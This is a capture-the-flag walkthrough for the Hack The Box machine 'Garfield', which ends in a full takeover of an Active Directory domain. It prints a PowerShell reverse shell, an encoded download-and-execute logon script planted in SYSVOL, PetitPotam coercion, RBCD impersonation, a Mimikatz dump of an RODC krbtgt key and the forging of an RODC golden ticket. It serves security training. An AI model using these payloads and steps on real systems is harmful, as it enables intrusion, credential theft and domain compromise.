
# 🐱 Garfield - HTB Machine Walkthrough

> **Machine:** Garfield  
> **Difficulty:** Hard  
> **Platform:** Hack The Box  
> **Date:** 11th May 2026  
> **Prepared By:** amra  
> **Machine Author(s):** amra  

---

## 📋 Table of Contents
- [Synopsis](#synopsis)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Initial Enumeration](#phase-2-initial-enumeration)
- [Phase 3: Dead Ends](#phase-3-dead-ends)
- [Phase 4: The Breakthrough](#phase-4-the-breakthrough)
- [Phase 5: Lateral Movement](#phase-5-lateral-movement)
- [Phase 6: Privilege Escalation](#phase-6-privilege-escalation)
- [Phase 7: Domain Takeover](#phase-7-domain-takeover)
- [Flags](#flags)
- [Attack Chain](#attack-chain)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## Synopsis

Garfield is a Hard-rated Windows machine that simulates a realistic Active Directory environment with a primary Domain Controller (**DC01**) and a Read-Only Domain Controller (**RODC01**). You're handed a set of domain credentials from the start — assume breach, just like a real internal engagement.

What looked like a dead end after initial enumeration slowly unraveled into a **6-stage attack chain**: from a logon script nobody was watching, through a password reset chain nobody locked down, to an **RODC Golden Ticket** that collapsed the entire domain's security model.

---

## Phase 1: Reconnaissance — "Mapping the Kingdom"

### Naabu — First Knock

```bash
┌──(root㉿kali)-[/home/kali]
└─# naabu -host 10.129.195.112 -p - -s s -verify 

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/

                projectdiscovery.io

[INF] Current naabu version 2.5.0 (latest)
[INF] Running SYN scan with CAP_NET_RAW privileges
10.129.195.112:5985
10.129.195.112:445
10.129.195.112:52113
10.129.195.112:49673
10.129.195.112:53
10.129.195.112:88
10.129.195.112:49670
10.129.195.112:593
10.129.195.112:49674
10.129.195.112:389
10.129.195.112:49671
10.129.195.112:636
10.129.195.112:3268
10.129.195.112:49899
10.129.195.112:3389
10.129.195.112:2179
10.129.195.112:3269
10.129.195.112:9389
10.129.195.112:49666
```

### Nmap — Looking Closer

19 ports came back open. DNS, Kerberos, LDAP, SMB, RPC — the usual suspects for a Domain Controller.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -Pn -p 53,88,389,445,593,636,2179,3268,3269,3389,5985,9389,49666,49670,49671,49673,49674,49899,52113 10.129.195.112 -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 03:49 -0400
Nmap scan report for garfield.htb (10.129.195.112)
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-07 15:54:07Z)
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-07T15:55:01+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h04m14s, deviation: 0s, median: 8h04m14s
```

**Key Findings:**
- **Hostname:** `DC01.garfield.htb`
- **OS:** Windows Server 2019 (Build 17763)
- **SMB Signing:** Enabled and required (no relay attacks)
- **Domain:** `garfield.htb`

```bash
echo "10.129.195.112 garfield.htb DC01.garfield.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2: Initial Enumeration — A Thousand Groups, Zero Paths

### The Starting Point

**Credentials:** `j.arbuckle / Th1sD4mnC4t!@1978`

```bash
┌──(root㉿kali)-[/home/kali]
└─# netexec smb 10.129.195.112 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978'
SMB         10.129.195.112  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.195.112  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
```

### SMB — Reading the Signs Wrong

```bash
┌──(root㉿kali)-[/home/kali]
└─# netexec smb 10.129.195.112 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
SMB         10.129.195.112  445    DC01             Share           Permissions     Remark
SMB         10.129.195.112  445    DC01             -----           -----------     ------
SMB         10.129.195.112  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.195.112  445    DC01             C$                              Default share
SMB         10.129.195.112  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.195.112  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.195.112  445    DC01             SYSVOL          READ            Logon server share
```

**⚠️ Critical Mistake:** `netexec --shares` only shows **share-level** permissions, not **NTFS-level** permissions. The `scripts` subfolder inside SYSVOL could have writable NTFS ACLs — and it did.

### Domain Users — Familiar Faces

```bash
┌──(root㉿kali)-[/home/kali]
└─# netexec smb 10.129.195.112 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
SMB         10.129.195.112  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.195.112  445    DC01             Administrator                 2025-10-03 17:29:26 0       Built-in account for administering the computer/domain
SMB         10.129.195.112  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.195.112  445    DC01             krbtgt                        2025-08-13 11:05:26 0       Key Distribution Center Service Account
SMB         10.129.195.112  445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller
SMB         10.129.195.112  445    DC01             j.arbuckle                    2025-09-09 15:50:55 0
SMB         10.129.195.112  445    DC01             l.wilson                      2026-01-27 21:40:33 0
SMB         10.129.195.112  445    DC01             l.wilson_adm                  2026-01-13 14:56:35 0
```

**Observations:**
- **krbtgt_8245** — RODC-specific KDC account
- **l.wilson** and **l.wilson_adm** — regular user and privileged counterpart (admin tiering)

### SYSVOL — A Script Hiding in Plain Sight

```bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.129.195.112/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'recurse ON; prompt OFF; ls'

\garfield.htb\scripts
  .                                   D        0  Tue Jan 27 17:13:47 2026
  ..                                  D        0  Tue Jan 27 17:13:47 2026
  printerDetect.bat                   A      217  Fri Sep 12 18:20:29 2025
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat printerDetect.bat
@echo off
echo Detecting installed printers...
echo ==============================

wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table

echo.
echo Printer detection completed.
pause
```

A harmless-looking logon script. Nothing sensitive — no hardcoded credentials, no UNC paths. I almost dismissed it entirely.

### BloodHound — The Tool That Lied by Omission

```bash
┌──(root㉿kali)-[/home/kali]
└─# bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -ns 10.129.195.112 -c all --dns-tcp
INFO: Found 1 domains
INFO: Found 2 computers
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
```

**BloodHound Results for j.arbuckle:**
- Member of: `Users`, `Domain Users`, `IT Support`
- Admin Count: `FALSE`
- Local Admin Privileges: `0`
- Execution Privileges: `0`
- Outbound Object Control: `0`
- Path to Domain Admins: **"Path not found."**

**What I didn't know yet:** BloodHound enumerates ACLs at the **object level**, not the **attribute level**. j.arbuckle had write access to exactly one attribute on l.wilson: **`scriptPath`**. And that one attribute was enough to compromise the entire domain.

---

## Phase 3: Dead Ends — Chasing Ghosts in the Domain

### AS-REP Roasting — Nobody Home

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-GetNPUsers garfield.htb/ -usersfile users.txt -dc-ip 10.129.195.112 -no-pass
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.arbuckle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User l.wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User l.wilson_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Kerberoasting — Still Nothing

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-GetUserSPNs garfield.htb/j.arbuckle:'Th1sD4mnC4t!@1978' -dc-ip 10.129.195.112
No entries found!
```

### PetitPotam — A Tempting Mirage

```bash
┌──(root㉿kali)-[/home/kali]
└─# python3 /home/kali/PetitPotam/PetitPotam.py 10.10.14.42 10.129.195.112 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
[+] Connected!
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

**Relay failed:**
```
[!] The client requested signing. Relaying to LDAP will not work!
[-] (SMB): Authenticating against ldap://10.129.195.112 as GARFIELD/DC01$ FAILED
```

### Password Spraying — Into the Void

```bash
┌──(root㉿kali)-[/home/kali]
└─# netexec smb 10.129.195.112 -u users.txt -p 'Th1sD4mnC4t!@1978' --continue-on-success
SMB         10.129.195.112  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
SMB         10.129.195.112  445    DC01             [-] garfield.htb\l.wilson:Th1sD4mnC4t!@1978 STATUS_LOGON_FAILURE
SMB         10.129.195.112  445    DC01             [-] garfield.htb\l.wilson_adm:Th1sD4mnC4t!@1978 STATUS_LOGON_FAILURE
```

**All dead ends.** The domain was hardened, my user appeared powerless, and BloodHound was blind.

---

## Phase 4: The Breakthrough — What BloodHound Couldn't See

### bloodyAD — Reading the Fine Print

```bash
┌──(root㉿kali)-[/home/kali]
└─# bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.195.112 get writable --detail
```

**Buried in the output:**
```
distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

**j.arbuckle had write access to `scriptPath` on l.wilson and l.wilson_adm.** This was the edge BloodHound couldn't see — a single attribute-level write permission completely invisible to both Legacy and Community Edition.

---

## Phase 5: Lateral Movement — From Script to Shell

### Weaponizing SYSVOL

I created a two-stage payload:

**1. Reverse shell script (`shell.ps1`):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.42",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

**2. .bat wrapper (`printerDetect.bat`):**
```bash
PAYLOAD="IEX(New-Object Net.WebClient).downloadString('http://10.10.14.42:8000/shell.ps1')"
ENCODED=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)
echo "@echo off" > printerDetect.bat
echo "powershell -nop -w hidden -enc $ENCODED" >> printerDetect.bat
```

**3. Upload to SYSVOL:**
```bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.129.195.112/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts\; put printerDetect.bat'
putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (0.2 kB/s) (average 0.2 kB/s)
```

**✅ Writable!** This folder had been writable the entire time.

### Catching the Shell

```bash
┌──(root㉿kali)-[/home/kali]
└─# bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.195.112 set object l.wilson scriptPath -v 'printerDetect.bat'
[+] l.wilson's scriptPath has been updated
```

**Listener catches the shell:**
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.195.112] 63991
whoami
garfield\l.wilson
PS C:\Windows\system32>
```

### ForceChangePassword — One Account Leads to Another

```powershell
PS C:\Windows\system32> $newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force
PS C:\Windows\system32> Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# evil-winrm -i 10.129.195.112 -u 'l.wilson_adm' -p 'WhoKnows123!'
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> type C:\Users\l.wilson_adm\Desktop\user.txt
8a65a7bc************************
```

---

## Phase 6: Privilege Escalation — Climbing the RODC Ladder

### AddSelf — Joining the Inner Circle

**BloodHound showed:** l.wilson_adm had `AddSelf` on the `RODC Administrators` group.

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Add-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm
```

**RODC01 is on an internal network:**
```powershell
*Evil-WinRM* PS> nslookup RODC01.garfield.htb
Name:    RODC01.garfield.htb
Address:  192.168.100.2
```

### RBCD — Faking Trust

**1. Create fake machine account:**
```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 10.129.195.112
[*] Successfully added machine account YOURPC$ with password Password123!.
```

**2. Configure RBCD delegation:**
```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-rbcd garfield.htb/l.wilson_adm:'WhoKnows123!' -delegate-from 'YOURPC$' -delegate-to 'RODC01$' -action write -dc-ip 10.129.195.112
[*] Delegation rights modified successfully!
```

**3. Request service ticket (after syncing time):**
```bash
┌──(root㉿kali)-[/home/kali]
└─# ntpdate -b 10.129.195.112
2026-04-07 23:46:55.049044 (-0400) +29057.094492 +/- 0.170469 10.129.195.112 s1 no-leap

┌──(root㉿kali)-[/home/kali]
└─# impacket-getST garfield.htb/'YOURPC$':'Password123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.195.112
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

### Chisel — Tunneling Into the Inner Network

**Download Chisel to DC01:**
```powershell
*Evil-WinRM* PS> certutil -urlcache -split -f http://10.10.14.42:9000/chisel.exe C:\Users\l.wilson_adm\Documents\chisel.exe
```

**Start Chisel server on Kali:**
```bash
┌──(root㉿kali)-[/home/kali]
└─# chisel server --reverse -p 8001
2026/04/07 23:50:52 server: Reverse tunnelling enabled
2026/04/07 23:50:52 server: Listening on http://0.0.0.0:8001
```

**Start Chisel client on DC01:**
```powershell
*Evil-WinRM* PS> .\chisel.exe client 10.10.14.42:8001 R:socks
2026/04/07 21:05:04 client: Connected (Latency 339.2648ms)
```

**SOCKS proxy live on port 1080.**

### psexec into RODC01

```bash
┌──(root㉿kali)-[/home/kali]
└─# export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache

┌──(root㉿kali)-[/home/kali]
└─# proxychains impacket-psexec garfield.htb/Administrator@RODC01.garfield.htb -k -no-pass -dc-ip 10.129.195.112 -target-ip 192.168.100.2
[*] Found writable share ADMIN$
[*] Uploading file KThCwazW.exe
[*] Creating service LPBx on 192.168.100.2.....
[*] Starting service LPBx.....

C:\Windows\system32> whoami
nt authority\system
```

### Mimikatz — Dumping the RODC's Secrets

```bash
┌──(root㉿kali)-[/home/kali]
└─# proxychains impacket-smbclient garfield.htb/Administrator@RODC01.garfield.htb -k -no-pass -dc-ip 10.129.195.112 -target-ip 192.168.100.2
# use C$
# cd Windows\Temp
# put /home/kali/mimikatz.exe
```

```powershell
C:\Windows\system32> C:\Windows\Temp\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357
RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2

 * Kerberos-Newer-Keys
    aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
    aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
    des_cbc_md5       (4096) : d540fe6192b9ecfe
```

---

## Phase 7: Domain Takeover — The Golden Ticket That Wasn't Read-Only

### Rewriting the Rules — Password Replication Policy

**RODC Golden Ticket requires PRP modification.** By default, Administrator is in the **deny list** (`msDS-NeverRevealGroup`).

**Clear the deny list first:**
```bash
┌──(root㉿kali)-[/home/kali]
└─# bloodyAD -u l.wilson_adm -p 'WhoKnows123!' -d garfield.htb --host 10.129.195.189 set object 'RODC01$' msDS-NeverRevealGroup -v ""
[+] RODC01$'s msDS-NeverRevealGroup has been updated
```

**Add Administrator to allow list:**
```bash
┌──(root㉿kali)-[/home/kali]
└─# bloodyAD -u l.wilson_adm -p 'WhoKnows123!' -d garfield.htb --host 10.129.195.189 set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
[+] RODC01$'s msDS-RevealOnDemandGroup has been updated
```

### Rubeus — Forging the Ticket

**⚠️ Important:** Rubeus v2.2.0 has a bug in RODC Golden Ticket implementation → `KRB_AP_ERR_BAD_INTEGRITY`. Use **v2.3.3** or newer.

**Forge RODC Golden Ticket with Rubeus v2.3.3:**
```powershell
*Evil-WinRM* PS> .\Rubeus_new.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /outfile:C:\Users\l.wilson_adm\Documents\rodc_golden_new.kirbi
[*] Forged a TGT for 'Administrator@garfield.htb'
[*] Ticket written to rodc_golden_new_2026_04_08_17_26_50_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

**Request TGS for CIFS on DC01:**
```powershell
*Evil-WinRM* PS> .\Rubeus_new.exe asktgs /ticket:C:\Users\l.wilson_adm\Documents\rodc_golden_new_2026_04_08_17_26_50_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /service:cifs/DC01.garfield.htb /dc:DC01.garfield.htb /ptt
[+] TGS request successful!
```

### psexec — Walking Through

```bash
┌──(root㉿kali)-[/home/kali]
└─# echo <base64_ticket> | base64 -d > /home/kali/tgs.kirbi

┌──(root㉿kali)-[/home/kali]
└─# impacket-ticketConverter /home/kali/tgs.kirbi /home/kali/tgs.ccache
[*] converting kirbi to ccache...
[+] done

┌──(root㉿kali)-[/home/kali]
└─# export KRB5CCNAME=/home/kali/tgs.ccache

┌──(root㉿kali)-[/home/kali]
└─# impacket-psexec garfield.htb/Administrator@DC01.garfield.htb -k -no-pass
Microsoft Windows [Version 10.0.17763.8385]
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
f49845e1************************
```

**Domain compromised.**

---

## 🏁 Flags

| **Flag** | **Value** |
|:---------|:----------|
| **User.txt** | `8a65a7bc************************` |
| **Root.txt** | `f49845e1************************` |

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          GARFIELD ATTACK CHAIN                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. RECONNAISSANCE                                                          │
│     └─> Nmap → garfield.htb identified                                      │
│                                                                             │
│  2. INITIAL ENUMERATION                                                     │
│     └─> bloodyAD → scriptPath WRITE on l.wilson discovered                  │
│                                                                             │
│  3. LATERAL MOVEMENT (j.arbuckle → l.wilson)                                │
│     ├─> Upload malicious printerDetect.bat to SYSVOL/scripts                │
│     ├─> Modify l.wilson's scriptPath                                        │
│     └─> Reverse shell as l.wilson                                           │
│                                                                             │
│  4. PASSWORD RESET (l.wilson → l.wilson_adm)                                │
│     └─> ForceChangePassword on l.wilson_adm → Evil-WinRM shell              │
│                                                                             │
│  5. RODC ADMIN (l.wilson_adm → RODC01)                                      │
│     ├─> AddSelf to RODC Administrators group                                │
│     ├─> RBCD delegation to impersonate Administrator                        │
│     ├─> Chisel SOCKS tunnel to internal network                             │
│     └─> psexec → SYSTEM on RODC01                                           │
│                                                                             │
│  6. RODC GOLDEN TICKET (RODC01 → DC01)                                      │
│     ├─> Mimikatz → krbtgt_8245 AES256 key extracted                         │
│     ├─> Clear msDS-NeverRevealGroup (deny list)                             │
│     ├─> Add Administrator to msDS-RevealOnDemandGroup (allow list)          │
│     ├─> Rubeus → RODC Golden Ticket forged                                  │
│     └─> psexec → SYSTEM on DC01                                             │
│                                                                             │
│  7. DOMAIN COMPROMISED                                                      │
│     └─> Root flag captured                                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🧠 Key Takeaways

1. **Enumerate deeper before exploiting wider.** The real path was a single attribute-level write permission that BloodHound couldn't see.

2. **Always test write access manually.** `netexec --shares` said READ on SYSVOL. The scripts subfolder was writable the entire time.

3. **RODC security is only as strong as who controls the computer object.** The entire "read-only" security model collapses if an attacker can write to `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup`.

4. **Denied PRP entries override allowed entries.** Clear the deny list first, then modify the allow list. Order matters.

5. **Tool versions matter more than you think.** Rubeus v2.2.0 fails with `KRB_AP_ERR_BAD_INTEGRITY`. v2.3.3 works perfectly.

6. **Understand your tools' destructive operations.** `bloodyAD set` overwrites; it doesn't append. In a CTF that's fine. In production, it causes immediate operational impact.

7. **When the map shows no roads, question the map.** BloodHound is blind to attribute-level DACLs. Don't trust any single tool as your only source of truth.

---

## 🛠️ Tools Used

| **Tool** | **Purpose** |
|:---------|:------------|
| **naabu / nmap** | Port scanning and service enumeration |
| **netexec** | SMB authentication, share enumeration, user enumeration, password spraying |
| **BloodHound CE** | AD attack path visualization (and its limitations) |
| **bloodyAD** | Attribute-level ACL enumeration, scriptPath modification, PRP manipulation |
| **Impacket** | addcomputer, RBCD, getST, psexec
